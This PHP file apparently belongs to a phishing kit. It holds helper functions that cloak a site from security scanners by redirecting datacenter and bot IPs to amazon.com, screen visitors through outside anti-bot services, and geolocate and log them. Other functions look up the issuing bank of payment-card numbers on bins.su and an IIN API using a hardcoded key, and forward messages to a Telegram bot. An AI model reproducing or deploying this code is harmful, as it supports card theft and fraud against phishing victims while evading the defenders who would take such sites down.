<?php
require_once __DIR__ . '/EntityClass.php';
use Core\EntityIpCheck;

function EntityMessage($action = "VISIT", $ip = "::1") {
    require_once __DIR__ . '/EntityVariables.php';

    $entity = new Core\EntityIpCheck();
    $result = $entity->lookup($ip);

    if ($result) {
        $logEntry = [
            'timestamp'      => date('c'),
            'visitorIp'      => $result['query'] ?? '',
            'isp'            => $result['isp'] ?? '',
            'visitorCountry' => $result['country'] ?? '',
            'visitorDevice'  => isMobile() ? 'mobile' : 'desktop',
            'message'        => $action
        ];

        $logDir = dirname(__DIR__) . '/logs';
        if (!is_dir($logDir)) {
            mkdir($logDir, 0777, true);
        }

        $logFile = $logDir . '/entity_visitors.jsonl';
        file_put_contents($logFile, json_encode($logEntry) . PHP_EOL, FILE_APPEND);
    }
}

function BlockBadVisitors(bool $show404 = true): bool
{
    $ip = $_SERVER['REMOTE_ADDR'] ?? '8.8.8.8';

    if ($ip === '::1') {
        $ip = '82.132.237.51';
    }

    // $whitelist = ['8.8.8.8'];

    // if (in_array($ip, $whitelist, true)) {
    //     return true;
    // }

    $botFile = dirname(__DIR__) . '/core/bots.json';

    $bot_ips = file_exists($botFile)
        ? json_decode(file_get_contents($botFile), true)
        : [];

    if (!is_array($bot_ips)) {
        $bot_ips = [];
    }

    $knownDatacenterISPs = [
        'Amazon','Microsoft','Google','DigitalOcean','OVH','Hetzner',
        'Cloudflare','Oracle','Linode','Contabo','Leaseweb','Fastly',
        'Choopa','Scaleway','Alibaba','Vultr','Facebook','Twitter',
        'Yandex','Datacamp Limited','Interconnecx, LLC',
    ];

    $visitorInfo = EntityInfo($ip);
    $isp = $visitorInfo['isp'] ?? '';

    $isDatacenter = false;
    foreach ($knownDatacenterISPs as $dcIsp) {
        if (stripos($isp, $dcIsp) !== false) {
            $isDatacenter = true;
            break;
        }
    }

    if ($isDatacenter && !in_array($ip, $bot_ips, true)) {
        $bot_ips[] = $ip;

        file_put_contents(
            $botFile,
            json_encode(array_values(array_unique($bot_ips)), JSON_PRETTY_PRINT),
            LOCK_EX
        );
    }

    if (in_array($ip, $bot_ips, true) || $isDatacenter) {

        if ($show404) {
            header("Location: https://amazon.com");
            exit;
        }

        return false;
    }

    return true;
}

function OnetimeAccess(string $ip): bool
{
    $botFile = dirname(__DIR__) . '/core/bots.json';

    $bot_ips = file_exists($botFile)
        ? json_decode(file_get_contents($botFile), true)
        : [];

    if (!is_array($bot_ips)) {
        $bot_ips = [];
    }

    if (!in_array($ip, $bot_ips, true)) {
        $bot_ips[] = $ip;

        return file_put_contents(
            $botFile,
            json_encode(array_values(array_unique($bot_ips)), JSON_PRETTY_PRINT),
            LOCK_EX
        ) !== false;
    }

    return true;
}

function EntityInfo($ip = "::1") {
    require_once __DIR__ . '/EntityVariables.php';
    $time = date("Y-m-d H:i:s");
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

    $visitorData = [
        'ip'             => $ip,
        'userAgent'      => $userAgent,
        'time'           => $time,
        'visitorCountry' => "Unknown",
        'visitorCountryCode' => "Unknown",
        'visitorDevice'  => "Unknown",
        'isp'            => "Unknown",
        'org'            => "Unknown",
        'location'       => [
            'city'      => "Unknown",
            'region'    => "Unknown",
            'zip'       => "Unknown",
            'latitude'  => "",
            'longitude' => ""
        ],
        'timezone'       => [
            'id'           => "Unknown",
            'utc'          => "Unknown",
            'current_time' => "Unknown"
        ]
    ];

    $entity = new Core\EntityIpCheck();
    $result = $entity->lookup($ip);

    if (is_array($result) && $result['status'] === 'success') {
        $visitorData['ip']             = $result['query'] ?? $visitorData['ip'];
        $visitorData['visitorCountry'] = $result['country'] ?? $visitorData['visitorCountry'];
        $visitorData['visitorCountryCode'] = $result['countryCode'] ?? $visitorData['visitorCountryCode'];
        $visitorData['visitorDevice']  = $result['visitorDevice'] ?? $visitorData['visitorDevice'];
        $visitorData['isp']            = $result['isp'] ?? $visitorData['isp'];
        $visitorData['org']            = $result['org'] ?? $visitorData['asn'];
        $visitorData['location']['city']      = $result['city'] ?? $visitorData['location']['city'];
        $visitorData['location']['region']    = $result['regionName'] ?? $result['region'] ?? $visitorData['location']['region'];
        $visitorData['location']['zip']       = $result['zip'] ?? $result['postal'] ?? $visitorData['location']['zip'];
        $visitorData['location']['latitude']  = $result['lat'] ?? $visitorData['location']['latitude'];
        $visitorData['location']['longitude'] = $result['lon'] ?? $visitorData['location']['longitude'];
        $visitorData['timezone']        = $result['timezone'] ?? $visitorData['timezone']['id'];
    }

    return $visitorData;
}

function itsUs(array $visitorInfo): bool
{
    return stripos($visitorInfo['visitorCountry'] ?? '', 'United States') !== false;
}

function isMobile() {
    return preg_match(
        '/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Tablet|Silk/i',
        $_SERVER['HTTP_USER_AGENT'] ?? ''
    );
}

function KarmaGetRandomQuote() {
    $quotes = [
        "And whoever puts their trust in Allah, then He alone is sufficient for them. — Qur’an 65:3",
        "Indeed, Allah is with those who trust in Him. — Qur’an 3:159",
        "So do not lose hope, nor be sad. You will surely be victorious if you are true believers. — Qur’an 3:139",
        "When you have taken a decision, put your trust in Allah. — Qur’an 3:159",
        "Indeed, Allah is with the patient. — Qur’an 2:153",
        "So be patient. Indeed, the promise of Allah is truth. — Qur’an 30:60",
        "Verily, with hardship comes ease. — Qur’an 94:6",
        "And be patient, for your patience is with the help of Allah. — Qur’an 16:127",
        "If you are grateful, I will surely increase you [in favor]. — Qur’an 14:7",
        "And Allah is the bestower of bounty to whomever He wills. — Qur’an 62:4",
        "Say: Whatever blessing you have is from Allah. — Qur’an 16:53",
        "Verily, in the remembrance of Allah do hearts find rest. — Qur’an 13:28",
        "The best among you are those who have the best manners and character. — Prophet Muhammad ﷺ (Bukhari)",
        "Modesty brings nothing but goodness. — Prophet Muhammad ﷺ (Muslim)",
        "Wealth is not in having many possessions, but true wealth is contentment of the soul. — Prophet Muhammad ﷺ (Bukhari & Muslim)",
        "And it is He who enriches and suffices. — Qur’an 53:48",
        "Indeed, your Lord extends provision to whom He wills. — Qur’an 17:30",
        "Whoever fears Allah, He will make a way for him and provide for him from where he does not expect. — Qur’an 65:2-3",
        "The best of people are those who are most beneficial to others. — Prophet Muhammad ﷺ (Daraqutni)",
        "There is no fatigue or illness that afflicts a Muslim, except that Allah expiates some of his sins. — Bukhari & Muslim",
        "Indeed, my Lord is near and responsive. — Qur’an 11:61",
        "And your Lord says: Call upon Me, I will respond to you. — Qur’an 40:60",
        "Whoever puts their trust in Allah – then indeed, Allah is Exalted in Might and Wise. — Qur’an 8:49",
        "Allah does not burden a soul beyond that it can bear. — Qur’an 2:286",
        "Say: Never will we be struck except by what Allah has decreed for us; He is our protector. — Qur’an 9:51",
        "And whoever turns away from My remembrance – indeed, he will have a depressed life. — Qur’an 20:124",
        "Indeed, Allah loves those who rely upon Him. — Qur’an 3:159",
        "And be not like those who forgot Allah, so He made them forget themselves. — Qur’an 59:19",
        "And whoever is patient and forgives – indeed, that is of the matters requiring determination. — Qur’an 42:43",
        "And whoever does righteous deeds, whether male or female, while being a believer – We will surely cause them to live a good life. — Qur’an 16:97",
        "Do not grieve; indeed Allah is with us. — Qur’an 9:40",
        "Indeed, Allah will not change the condition of a people until they change what is in themselves. — Qur’an 13:11",
        "Indeed, the mercy of Allah is near to the doers of good. — Qur’an 7:56",
        "And establish prayer for My remembrance. — Qur’an 20:14",
        "So remember Me; I will remember you. — Qur’an 2:152",
        "Indeed, good deeds erase bad deeds. — Qur’an 11:114",
        "Indeed, those who have believed and done righteous deeds – they will have the Gardens of Paradise. — Qur’an 18:107",
        "Indeed, Allah loves those who are constantly repentant and loves those who purify themselves. — Qur’an 2:222",
        "And your Lord is Forgiving, Full of Mercy. — Qur’an 18:58",
        "And Allah is the best of planners. — Qur’an 3:54",
        "Whoever comes [on the Day of Judgment] with a good deed will have ten times the like thereof. — Qur’an 6:160",
        "The strong believer is more beloved to Allah than the weak believer, while there is good in both. — Prophet Muhammad ﷺ (Muslim)",
        "Make things easy, and do not make them difficult. — Prophet Muhammad ﷺ (Bukhari)",
        "Whoever does not thank people has not thanked Allah. — Prophet Muhammad ﷺ (Ahmad, Tirmidhi)",
        "Do not become angry. — Prophet Muhammad ﷺ (Bukhari)",
        "The most beloved deeds to Allah are those done regularly, even if they are small. — Prophet Muhammad ﷺ (Bukhari)",
        "A smile is charity. — Prophet Muhammad ﷺ (Tirmidhi)",
        "Allah is Gentle and loves gentleness in all matters. — Prophet Muhammad ﷺ (Bukhari & Muslim)",
        "He who does not show mercy to others, will not be shown mercy. — Prophet Muhammad ﷺ (Bukhari & Muslim)",
        "The best among you are those who learn the Qur’an and teach it. — Prophet Muhammad ﷺ (Bukhari)",
        "None of you truly believes until he loves for his brother what he loves for himself. — Prophet Muhammad ﷺ (Bukhari & Muslim)",
        "Part of the perfection of one's Islam is his leaving that which does not concern him. — Prophet Muhammad ﷺ (Tirmidhi)",
        "He who believes in Allah and the Last Day should speak good or remain silent. — Prophet Muhammad ﷺ (Bukhari & Muslim)",
        "Whoever follows a path in pursuit of knowledge, Allah will make a path to Paradise easy for him. — Prophet Muhammad ﷺ (Muslim)",
        "Be in this world as though you were a stranger or a traveler. — Prophet Muhammad ﷺ (Bukhari)",
        "Fear Allah wherever you are, and follow up a bad deed with a good one and it will wipe it out. — Prophet Muhammad ﷺ (Tirmidhi)",
        "The most beloved of people to Allah are those who bring the most benefit to others. — Prophet Muhammad ﷺ (Tabarani)",
        "Whoever relieves a believer’s distress of the distressful aspects of this world, Allah will rescue him from a difficulty of the difficulties of the Hereafter. — Prophet Muhammad ﷺ (Muslim)"
    ];
    return $quotes[array_rand($quotes)];
}
function getCardDetailsFromBIN($bin) {
    $url = "https://bins.su/";
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $headers = array(
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.8",
        "Cache-Control: max-age=0",
        "Connection: keep-alive",
        "Content-Type: application/x-www-form-urlencoded",
        "Origin: https://bins.su/",
        "Referer: https://bins.su/",
        "Sec-Fetch-Dest: document",
        "Sec-Fetch-Mode: navigate",
        "Sec-Fetch-Site: same-origin",
        "Sec-Fetch-User: ?1",
        "Sec-GPC: 1",
        "Upgrade-Insecure-Requests: 1",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/119.0.0.0 Safari/537.36",
        "sec-ch-ua: 'Brave';v='119', 'Chromium';v='119', 'Not?A_Brand';v='24'",
        "sec-ch-ua-mobile: ?0",
        "sec-ch-ua-platform: 'Windows'",
    );
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

    $postData = "action=searchbins&bins=$bin&bank=&country=";
    curl_setopt($curl, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

    $resp = curl_exec($curl);
    if (curl_errno($curl)) {
        echo 'Curl error: ' . curl_error($curl);
    }

    curl_close($curl);

    if (empty($resp)) {
        return null;
    }

    $pattern = '#</tr><tr><td>(.*?)</td><td>(.*?)</td><td>(.*?)</td><td>(.*?)</td><td>(.*?)</td><td>(.*?)</td>#s';
    preg_match($pattern, $resp, $matches);

    if (empty($matches)) {
        return null; 
    }

    return [
        'issuer'    => !empty($matches[6]) ? $matches[6] : "unknown bank",
        'card_tier' => !empty($matches[3]) ? $matches[3] : "unknown brand",
        'scheme'    => !empty($matches[4]) ? $matches[4] : "unknown type",
        'type'      => !empty($matches[6]) ? $matches[6] : "unknown bank"
    ];
}
function EntityDetectBin(string $digits): ?array
{
    require_once __DIR__ . '/EntityVariables.php';

    $apiKey = defined('IIN_API_KEY')
        ? IIN_API_KEY
        : 'SU36wU3C5EW3BlaDpgDhs1hzdpJbijdK';

    if (empty($digits)) {
        return null;
    }

    $url = 'https://api.iinapi.com/iin?' . http_build_query([
        'key'    => $apiKey,
        'digits' => $digits
    ]);

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_HTTPHEADER     => ['Accept: application/json']
    ]);

    $response = curl_exec($ch);
    $status   = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($response === false || $status !== 200) {
        return null;
    }

    $json = json_decode($response, true);

    if (!empty($json['valid']) && isset($json['result']) && is_array($json['result'])) {
        return $json['result'];
    }

    return null;
}
function CheckEntity($karma_ip, $karma_user_agent) {
    $karma_config = require __DIR__ . '/../KarmaEntity/config/config.php';
    require_once __DIR__ . '/EntityVariables.php';
    require_once __DIR__ . '/EntityFunctions.php';

    $entityApiKey = $karma_config['entity_apikey'];
    $apiUrl = "https://entitygate.net/api/whoami/v1/sc";

    if (empty($karma_ip)) {
        error_log("CheckEntity: Empty IP, aborting.");
        return false;
    }

    if (empty($karma_user_agent)) {
        $karma_user_agent = 'Mozilla/5.0 (compatible; EntityBotChecker/1.0)';
    }

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "x-entity-api-key: $entityApiKey",
        "x-visitor-ip-asli: $karma_ip",
        "x-visitor-user-agent: $karma_user_agent",
        'x-visitor-accept: ' . ($_SERVER['HTTP_ACCEPT'] ?? ''),
        'x-visitor-accept-language: ' . ($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? ''),
        'x-visitor-accept-encoding: ' . ($_SERVER['HTTP_ACCEPT_ENCODING'] ?? ''),
        'x-visitor-connection: ' . ($_SERVER['HTTP_CONNECTION'] ?? ''),
        'x-visitor-referer: ' . ($_SERVER['HTTP_REFERER'] ?? ''),
        'x-visitor-sec-fetch-site: ' . ($_SERVER['HTTP_SEC_FETCH_SITE'] ?? ''),
        'x-visitor-sec-ch-ua: ' . ($_SERVER['HTTP_SEC_CH_UA'] ?? ''),
    ]);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $data = json_decode($response, true);

    if ($httpCode === 200 && isset($data['allowed']) && $data['allowed']) {
        EntityMessage('VISIT', $karma_ip);
        return true;
    } elseif ($httpCode === 403 && isset($data['reason'])) {
        EntityMessage('BLOCKED BY ENTITY', $karma_ip);
        header("Location: https://http.cat/images/404.jpg");
        exit;
    } elseif ($httpCode === 429) {
        die("Too many requests. Please try again later.");
    } else {
        die($response);
    }
}
function CheckGoBot($karma_ip, $karma_user_agent) {
    $karma_config = require __DIR__ . '/../KarmaEntity/config/config.php';
    require_once __DIR__ . '/EntityVariables.php';
    require_once __DIR__ . '/EntityFunctions.php';

    $apiKey = $karma_config['entity_apikey'];
    $apiUrl = "https://gobot.su/api/v1/blocker";

    if (empty($karma_ip)) {
        error_log("CheckGoBot: Empty IP, aborting.");
        return false;
    }

    if (empty($karma_user_agent)) {
        $karma_user_agent = 'Mozilla/5.0 (compatible; GoBotChecker/1.0)';
    }

    $postData = http_build_query([
        'apikey' => $apiKey,
        'ip'     => $karma_ip,
        'ua'     => $karma_user_agent,
        'url'    => 'REQUESTED BY ENTITY',
        'reff'   => ($_SERVER['HTTP_REFERER'] ?? 'direct')
    ]);

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "accept: application/json",
        "Content-Type: application/x-www-form-urlencoded"
    ]);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    if (curl_errno($ch)) {
        $error = curl_error($ch);
        curl_close($ch);
        error_log("CheckGoBot cURL error: " . $error);
        return false;
    }

    curl_close($ch);

    $data = json_decode($response, true);

    if (!is_array($data) || !isset($data['action'])) {
        error_log("CheckGoBot unexpected response: " . $response);
        return false;
    }

    if ($data['action'] === 'allow') {
        EntityMessage('VISIT', $karma_ip);
        return true;

    } elseif ($data['action'] === 'block') {
        EntityMessage('BLOCKED BY GOBOT', $karma_ip);
        header("Location: https://http.cat/403");
        exit;

    } else {
        error_log("CheckGoBot unknown action: " . $data['action']);
        return false;
    }
}
function SendToTelegram(string $message, array $opts = [])
{
    $botToken = $opts['bot_token'] ?? (defined('TELEGRAM_BOT_TOKEN') ? TELEGRAM_BOT_TOKEN : null);
    $chatId   = $opts['chat_id']   ?? (defined('TELEGRAM_CHAT_ID') ? TELEGRAM_CHAT_ID : null);

    if (empty($botToken) || empty($chatId)) {
        error_log('SendToTelegram: missing bot token or chat id');
        return false;
    }

    $payload = [
        'chat_id' => $chatId,
        'text'    => $message,
    ];

    if (!empty($opts['parse_mode'])) {
        $payload['parse_mode'] = $opts['parse_mode'];
    }

    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";

    if (function_exists('curl_version')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 10,
        ]);

        $result = curl_exec($ch);
        $err    = curl_error($ch);
        curl_close($ch);

        if ($result === false) {
            error_log("SendToTelegram cURL error: $err");
            return false;
        }

        return json_decode($result, true);
    }

    $context = stream_context_create([
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($payload),
            'timeout' => 10,
        ]
    ]);

    $result = @file_get_contents($url, false, $context);

    if ($result === false) {
        error_log('SendToTelegram fallback failed');
        return false;
    }

    return json_decode($result, true);
}
?>
